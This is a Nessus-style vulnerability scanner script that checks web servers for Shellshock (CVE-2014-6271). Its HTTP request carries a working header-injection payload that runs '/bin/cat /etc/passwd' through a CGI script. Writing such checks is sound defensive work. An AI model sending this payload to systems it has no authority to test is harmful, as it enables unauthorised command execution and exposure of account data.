if (description)
{
  script_id(900002);
  script_version("1.0");
  script_name("Shellshock Vulnerability Check");
  script_summary("Checks for Shellshock vulnerability (CVE-2014-6271).");
  script_set_attribute(attribute:"synopsis", value:"The remote host is vulnerable to Shellshock.");
  script_set_attribute(attribute:"description", value:
    "The remote host is vulnerable to Shellshock, a critical vulnerability in the Bash shell that allows remote code execution."
  );
  script_set_attribute(attribute:"solution", value:
    "Apply the appropriate patches as soon as possible."
  );
  script_set_attribute(attribute:"see_also", value:"https://nvd.nist.gov/vuln/detail/CVE-2014-6271");
  script_set_attribute(attribute:"cvss_base", value:"10.0");
  script_family("General");
  script_category(ACT_GATHER_INFO);
  script_copyright("2025, Your Name");
  script_dependencies("ssh_detect.nasl");
  exit(0);
}

include("compat.inc");
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (description) exit(0);

port = get_http_port(default:80);

# Craft the request to test for Shellshock
req = string("GET /cgi-bin/test.cgi HTTP/1.1\r\n",
             "User-Agent: () { :;}; echo; echo; /bin/cat /etc/passwd\r\n",
             "Host: ", get_host_name(), "\r\n",
             "Connection: Close\r\n\r\n");

soc = http_open_socket(port);
if (!soc) exit(0);

send(socket:soc, data:req);
res = http_recv(socket:soc);

# Check the response for signs of vulnerability
if ("root:" >< res)
{
  security_hole(port);
}
else
{
  display("The target is not vulnerable to Shellshock.\n");
}

close(soc);
